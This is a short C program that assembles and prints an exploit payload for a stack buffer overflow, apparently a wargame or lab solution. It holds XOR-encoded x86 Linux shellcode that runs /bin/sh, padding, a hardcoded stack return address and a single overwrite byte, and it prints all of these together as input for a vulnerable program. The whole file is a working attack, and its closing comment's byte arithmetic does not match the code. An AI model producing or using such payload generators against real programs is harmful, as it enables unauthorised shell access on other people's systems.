#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char shellcode[] = 
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07" 
	"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d" 
	"\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80" 
	"\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

char pad[15];

char addr[] = "\x88\xfb\xff\xbf";

char byte[] = "\xc0";

void main()
	{
		int i;

		for (i = 0; i < 45; i++)
			shellcode[i] = shellcode[i] ^ (1u << 5);

		for(i = 0; i < 15; i++){
			pad[i] = '\x41';
			pad[i] = pad[i] ^ (1u << 5);
		}

		for (i = 0; i < 4; i++)
			addr[i] = addr[i] ^ (1u << 5);

		byte[0] = byte[0] ^ (1u << 5);

		printf("%s%s%s%s", shellcode, pad, addr, byte);
		
		// 16 + 45 + 3 + 1 = 65
}



